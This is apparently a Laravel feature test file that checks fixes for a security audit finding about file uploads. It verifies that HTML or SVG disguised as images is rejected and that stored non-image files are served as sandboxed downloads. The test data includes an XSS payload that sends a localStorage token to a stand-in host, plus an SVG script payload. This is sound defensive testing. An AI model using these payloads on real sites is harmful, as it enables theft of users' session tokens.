<?php

namespace Tests\Feature;

use App\Models\Tenant;
use App\Models\User;
use App\Rules\ArchivoSubido;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Tests\TestCase;

// Auditoría de seguridad 08-oct-2026, hallazgo 3: varias subidas aceptaban
// cualquier archivo, y /tenancy/assets los servía en el mismo dominio que el
// panel — un .html/.svg subido como "imagen" se abría como página del sistema
// (XSS que roba el token de localStorage).
//
// Mismo patrón que SeguridadRegistroYUsuarioInactivoTest: tenant físico real.
class SeguridadArchivosSubidosTest extends TestCase
{
    private ?Tenant $tenant = null;

    private const HTML_MALICIOSO = '<html><body><script>fetch("//x.test/?t="+localStorage.token)</script></body></html>';

    protected function setUp(): void
    {
        parent::setUp();

        config([
            'database.default' => 'pgsql',
            'database.connections.pgsql.host' => env('DB_HOST', '127.0.0.1'),
            'database.connections.pgsql.port' => env('DB_PORT', '5432'),
            'database.connections.pgsql.database' => 'sistemafe_test_migrations',
            'database.connections.pgsql.username' => env('DB_USERNAME', 'root'),
            'database.connections.pgsql.password' => env('DB_PASSWORD', ''),
            'database.connections.central.database' => 'sistemafe_test_migrations',
        ]);
        DB::purge('pgsql');
        DB::purge('central');

        if (! Schema::connection('central')->hasTable('tenants')) {
            Artisan::call('migrate', [
                '--path' => [
                    'database/migrations/2019_09_15_000010_create_tenants_table.php',
                    'database/migrations/2019_09_15_000020_create_domains_table.php',
                    'database/migrations/2026_07_13_120000_add_status_to_tenants_table.php',
                    'database/migrations/2026_07_27_090000_add_giro_tipo_sunat_modo_to_tenants_table.php',
                ],
                '--force' => true,
            ]);
        }
    }

    protected function tearDown(): void
    {
        tenancy()->end();
        DB::purge('tenant');

        $tenant = $this->tenant?->fresh();
        if ($tenant) {
            if ($tenant->database()->manager()->databaseExists($tenant->database()->getName())) {
                $tenant->database()->manager()->deleteDatabase($tenant);
            }
            File::deleteDirectory(storage_path(config('tenancy.filesystem.suffix_base') . $tenant->getTenantKey()));
            $tenant->delete();
        }

        parent::tearDown();
    }

    private function crearTenant(): Tenant
    {
        $id = 'test-arch-' . Str::lower(Str::random(8));
        $this->tenant = Tenant::create(['id' => $id, 'ruc' => $id, 'razon_social' => "Tenant de prueba {$id}"]);
        $this->tenant->domains()->create(['domain' => $id]);

        return $this->tenant;
    }

    private function tokenSuperAdmin(Tenant $tenant): string
    {
        return $tenant->run(function () {
            DB::table('roles')->insert([
                ['id' => 1, 'name' => 'Super-Admin', 'guard_name' => 'api', 'created_at' => now(), 'updated_at' => now()],
            ]);
            $user = User::factory()->create(['state' => 1, 'role_id' => 1]);
            $user->assignRole('Super-Admin');

            return auth('api')->login($user->fresh());
        });
    }

    // Archivo REAL en disco: UploadedFile::fake() informa el tipo según el NOMBRE
    // (Testing\File::getMimeType()), así que un HTML llamado foto.jpg "pasaría" — en
    // un request real Laravel valida mimes por el CONTENIDO (guessExtension()).
    private function archivoReal(string $nombre, string $contenido): UploadedFile
    {
        $ruta = tempnam(sys_get_temp_dir(), 'upl');
        file_put_contents($ruta, $contenido);

        return new UploadedFile($ruta, $nombre, null, null, true);
    }

    private function pngReal(): string
    {
        return UploadedFile::fake()->image('foto.png', 10, 10)->getContent();
    }

    private function url(Tenant $tenant, string $path): string
    {
        return "http://{$tenant->id}.sistemafe.test/{$path}";
    }

    public function test_regla_rechaza_html_y_svg_aunque_digan_ser_imagen_y_acepta_imagen_real(): void
    {
        $valida = fn (UploadedFile $f) => Validator::make(['f' => $f], ['f' => ArchivoSubido::imagen()])->passes();

        $this->assertFalse($valida($this->archivoReal('foto.jpg', self::HTML_MALICIOSO)));
        $this->assertFalse($valida($this->archivoReal(
            'logo.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        )));
        $this->assertTrue($valida($this->archivoReal('foto.png', $this->pngReal())));

        $validaAdjunto = fn (UploadedFile $f) => Validator::make(['f' => $f], ['f' => ArchivoSubido::imagenOPdf()])->passes();
        $this->assertTrue($validaAdjunto($this->archivoReal('voucher.pdf', "%PDF-1.4\n%%EOF\n")));
        $this->assertFalse($validaAdjunto($this->archivoReal('voucher.pdf', self::HTML_MALICIOSO)));
    }

    public function test_api_de_productos_rechaza_html_disfrazado_de_imagen_y_no_lo_guarda(): void
    {
        $tenant = $this->crearTenant();
        $token = $this->tokenSuperAdmin($tenant);

        $this->withHeaders(['Authorization' => "Bearer {$token}"])
            ->post($this->url($tenant, 'api/products'), [
                'title' => 'Producto de prueba',
                'image' => $this->archivoReal('foto.jpg', self::HTML_MALICIOSO),
            ], ['Accept' => 'application/json'])
            ->assertStatus(422)
            ->assertJsonValidationErrors('image');

        $this->assertSame([], $tenant->run(fn () => Storage::disk('public')->allFiles('products')));
    }

    public function test_archivo_ya_guardado_que_no_es_imagen_se_sirve_como_descarga_aislada(): void
    {
        $tenant = $this->crearTenant();
        $tenant->run(function () {
            Storage::disk('public')->put('prueba/malicioso.html', self::HTML_MALICIOSO);
            Storage::disk('public')->put('prueba/foto.png', $this->pngReal());
        });

        $html = $this->get($this->url($tenant, 'tenancy/assets/prueba/malicioso.html'));
        $html->assertOk();
        $this->assertSame('sandbox', $html->headers->get('Content-Security-Policy'));
        $this->assertStringStartsWith('attachment', (string) $html->headers->get('Content-Disposition'));
        $this->assertSame('nosniff', $html->headers->get('X-Content-Type-Options'));

        tenancy()->end();
        $png = $this->get($this->url($tenant, 'tenancy/assets/prueba/foto.png'));
        $png->assertOk();
        $this->assertNull($png->headers->get('Content-Security-Policy'));
        $this->assertStringNotContainsString('attachment', (string) $png->headers->get('Content-Disposition'));
    }
}
